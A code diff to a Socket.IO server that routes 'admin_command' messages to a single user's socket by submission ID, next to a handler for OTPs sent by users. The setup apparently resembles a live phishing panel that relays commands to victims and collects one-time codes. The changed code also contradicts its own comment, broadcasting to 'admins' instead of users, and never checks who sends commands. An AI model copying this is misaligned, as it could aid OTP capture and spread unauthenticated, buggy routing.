@@ -44,10 +44,29 @@ io.on('connection', (socket) => {
 
   // Handler for commands from an admin
   socket.on('admin_command', (payload) => {
-    if (payload.submission_id) {
-      // Send the command ONLY to the specific user
-      io.to(payload.submission_id).emit('admin_command', payload);
+    console.log('Server received admin_command:', payload);
+    
+    // Get the target socket ID from the payload
+    const targetSocketId = payload.submission_id;
+    
+    if (!targetSocketId) {
+      console.log('No target socket ID provided, broadcasting to all users');
+      // Broadcast to all users except admins
+      io.to('admins').emit('admin_command', payload);
+      return;
     }
+
+    // Get the target socket
+    const targetSocket = io.sockets.sockets.get(targetSocketId);
+    
+    if (!targetSocket) {
+      console.log('Target socket not found:', targetSocketId);
+      return;
+    }
+
+    // Send command to specific user
+    console.log('Sending command to target socket:', targetSocketId);
+    targetSocket.emit('admin_command', payload);
   });
 
   // Handler for OTPs from a user
